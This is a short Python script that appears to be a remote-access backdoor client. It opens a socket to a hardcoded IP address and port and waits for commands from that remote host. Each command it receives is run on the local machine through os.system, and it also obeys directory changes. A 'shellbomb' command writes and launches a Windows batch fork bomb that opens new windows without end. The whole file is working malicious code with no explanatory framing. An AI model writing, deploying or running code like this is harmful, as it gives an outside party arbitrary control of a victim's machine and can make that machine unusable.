import socket
import os

ip = "172.17.1.221"
port = 55555
run = True

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))


def receive():
    data = client.recv(1024)
    return data.decode("ascii")


def terminal(command):
    os.system(command)


def cdAccess(cd):
    os.chdir(cd)


def shellbomb():
    f = open("shellbomb.bat", "w")
    f.write("@echo off\n:l\nstart\ngoto :l")
    f.close()
    os.system("shellbomb.bat")


def execute(data):
    global run
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data == "shellbomb":
        shellbomb()
    else:
        terminal(data)


while run == True:
    execute(receive())